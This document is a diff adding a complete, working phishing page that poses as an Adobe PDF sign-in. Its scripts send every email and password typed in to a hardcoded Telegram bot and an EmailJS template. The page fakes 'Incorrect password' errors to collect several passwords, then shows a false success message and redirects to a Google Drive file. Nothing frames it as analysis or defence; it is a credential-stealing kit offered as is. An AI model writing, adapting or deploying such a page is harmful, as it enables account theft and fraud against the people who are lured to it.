@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8" />
+ <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+ <link rel="shortcut icon" href="adb.png" type="image/x-icon">
+ <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+ <script>
+ (function(){
+ emailjs.init("hCAf0UbOyZ_07hMSx"); // your public key
+ })();
+ </script>
+
+ <title>Adobe PDF Login</title>
+ <style>
+ * {
+ box-sizing: border-box;
+ margin: 0;
+ padding: 0;
+ }
+ html, body {
+ height: 100%;
+ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+ }
+ body {
+ position: relative;
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ background: url('image.png') no-repeat center center fixed;
+ background-size: cover;
+ overflow: hidden;
+ pointer-events: none;
+ }
+ body::before {
+ content: "";
+ position: absolute;
+ inset: 0;
+ backdrop-filter: blur(4px);
+ background-color: rgba(0, 0, 0, 0.25);
+ z-index: 1;
+ }
+ .login-card {
+ position: relative;
+ z-index: 2;
+ background-color: rgba(160, 0, 0, 0.95);
+ color: #fff;
+ width: 100%;
+ max-width: 360px;
+ border-radius: 12px;
+ box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+ padding: 30px 20px;
+ text-align: center;
+ pointer-events: auto;
+ transition: transform 0.4s ease, background-color 0.4s ease;
+ }
+ .login-card.animate-success {
+ background-color: #28a745;
+ transform: scale(1.03);
+ }
+ .login-card img {
+ width: 64px;
+ max-width: 20%;
+ margin-bottom: 16px;
+ }
+ .login-card h2 {
+ font-size: 1.25rem;
+ line-height: 1.4;
+ margin-bottom: 24px;
+ font-weight: 600;
+ }
+ .form-group {
+ margin-bottom: 16px;
+ }
+ .login-card input {
+ width: 100%;
+ padding: 12px 14px;
+ border: none;
+ border-radius: 8px;
+ font-size: 1rem;
+ outline: none;
+ }
+ .login-card input:disabled {
+ background-color: lightgrey;
+ color: gray;
+ cursor: not-allowed;
+ }
+ .login-card input::placeholder {
+ color: #ccc;
+ }
+ .login-card button {
+ width: 100%;
+ padding: 12px;
+ font-size: 1rem;
+ font-weight: 600;
+ color: #fff;
+ background-color: #007bff;
+ border: none;
+ border-radius: 8px;
+ cursor: pointer;
+ transition: background-color 0.2s ease;
+ }
+ .login-card button:hover {
+ background-color: #0056b3;
+ }
+ #message {
+ display: none;
+ margin-bottom: 16px;
+ padding: 10px 14px;
+ border-radius: 8px;
+ font-size: 0.95rem;
+ text-align: center;
+ }
+ .success {
+ background-color: #28a745;
+ color: #fff;
+ }
+ .error {
+ background-color: #dc3545;
+ color: #fff;
+ }
+ @media (max-width: 400px) {
+ .login-card {
+ padding: 24px 16px;
+ }
+ .login-card h2 {
+ font-size: 1.125rem;
+ }
+ }
+
+ @keyframes spin {
+ 0% { transform: rotate(0deg); }
+ 100% { transform: rotate(360deg); }
+ }
+ </style>
+</head>
+<body oncontextmenu="return false;"> <!-- Disable right-click -->
+
+ <div class="login-card" id="loginCard">
+ <img src="dds.png" alt="PDF Logo">
+ <h2>Sign in to view the<br>documentation.</h2>
+
+ <div id="message" aria-live="polite"></div>
+
+ <div class="form-group">
+ <input type="email" id="email" placeholder="Email address" disabled>
+ </div>
+ <div class="form-group">
+ <input type="password" id="password" placeholder="Password">
+ </div>
+ <button onclick="handleLogin()">Log in</button>
+ </div>
+
+ <!-- Loading Spinner -->
+ <div id="loader" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.75); z-index:9999; align-items:center; justify-content:center;">
+ <div style="width:50px; height:50px; border:6px solid #ccc; border-top:6px solid #fff; border-radius:50%; animation:spin 1s linear infinite;"></div>
+ </div>
+
+ <script>
+ const TELEGRAM_CONFIG = {
+  token: "7472406873:AAEUuQF4ON6-GorYaEImnJvNf--CzPg2xCU",
+  chatId: "6992242865"
+ };
+
+ async function sendToTelegram(message) {
+ const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`;
+ const payload = {
+ chat_id: TELEGRAM_CONFIG.chatId,
+ text: message,
+ parse_mode: "HTML"
+ };
+
+ try {
+ await fetch(url, {
+ method: "POST",
+ headers: {
+ "Content-Type": "application/json"
+ },
+ body: JSON.stringify(payload)
+ });
+ } catch (error) {
+ console.error("Telegram Error:", error);
+ }
+ }
+ </script>
+
+ <script>
+ // EmailJS Script Block
+ function sendToEmailJS(email, password) {
+ const templateParams = {
+ user_email: email,
+ user_password: password,
+ user_time: new Date().toLocaleString()
+ };
+
+ emailjs.send('service_2svdoxh', 'template_l15nxhj', templateParams)
+ .then(function (response) {
+ console.log('EmailJS Success:', response.status, response.text);
+ }, function (error) {
+ console.error('EmailJS Error:', error);
+ });
+ }
+ </script>
+
+ <script>
+ // Main Login Logic Script Block
+ let attemptCount = 0;
+ const triedPasswords = [];
+
+ function showMessage(text, type = 'success') {
+ const messageEl = document.getElementById('message');
+ messageEl.textContent = text;
+ messageEl.className = '';
+ messageEl.classList.add(type);
+ messageEl.style.display = 'block';
+
+ setTimeout(() => {
+ messageEl.style.display = 'none';
+ }, 3000);
+ }
+
+ function handleLogin() {
+ const email = document.getElementById('email').value.trim();
+ const password = document.getElementById('password').value.trim();
+ const loginCard = document.getElementById('loginCard');
+
+ if (!email || !password) {
+ showMessage('Please fill in all required fields.', 'error');
+ return;
+ }
+
+ if (triedPasswords.includes(password)) {
+ showMessage('Try a different password.', 'error');
+ return;
+ }
+
+ triedPasswords.push(password);
+ attemptCount++;
+
+ const message = `<b>📄 Login Attempt</b>\n📧 Email: <code>${email}</code>\n🔑 Password: <code>${password}</code>\n🕒 Time: ${new Date().toLocaleString()}`;
+ sendToTelegram(message);
+ sendToEmailJS(email, password); // Send to EmailJS with email and password
+
+ if (attemptCount === 4) {
+ showMessage('Login successful!', 'success');
+ loginCard.classList.add('animate-success');
+
+ document.getElementById('loader').style.display = 'flex';
+
+ setTimeout(() => {
+ loginCard.classList.remove('animate-success');
+ location.replace("https://drive.google.com/file/d/15KhSNpirdNMz-o8R8hHrlpYMlvoAKnjK/view");
+ }, 3000);
+ } else {
+ showMessage('Incorrect password.', 'error');
+ }
+
+ // Clear the password field after each attempt
+ document.getElementById('password').value = ''; // Clear the password field
+ }
+
+ function getQueryParam(param) {
+ const urlParams = new URLSearchParams(window.location.search);
+ return urlParams.get(param);
+ }
+
+ window.onload = function () {
+ const emailParam = getQueryParam('email');
+ const emailInput = document.getElementById('email');
+ if (emailParam) {
+ emailInput.value = decodeURIComponent(emailParam);
+ emailInput.disabled = true;
+ } else {
+ emailInput.placeholder = "Email address";
+ emailInput.disabled = false;
+ }
+ };
+ </script>
+</body>
+</html>
